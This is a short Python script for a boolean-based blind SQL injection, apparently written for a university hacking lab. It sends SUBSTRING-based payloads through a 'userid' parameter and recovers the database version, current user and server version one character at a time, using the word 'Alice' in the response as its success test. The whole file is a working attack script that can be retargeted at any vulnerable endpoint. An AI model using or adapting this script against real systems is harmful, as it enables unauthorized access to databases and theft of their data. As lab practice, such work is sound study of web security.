import requests

url = "http://haklab-n1.cs.technikum-wien.at/sql/index.php"

def extract_value(query, max_length=50):
    extracted = ""
    for position in range(1, max_length + 1):
        for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@._- ":
            payload = f"1 AND SUBSTRING(({query}), {position}, 1) = '{char}'--"
            params = {"userid": payload}
            response = requests.get(url, params=params)
            if "Alice" in response.text:  # Adjust based on the success condition
                extracted += char
                break
        else:
            break  # Stop when no more characters are found
    return extracted

# Extract database version
print("Database Version:", extract_value("@@version"))

# Extract current user
print("Current User:", extract_value("USER()"))

# Extract server version
print("Server Version:", extract_value("@@version_comment"))
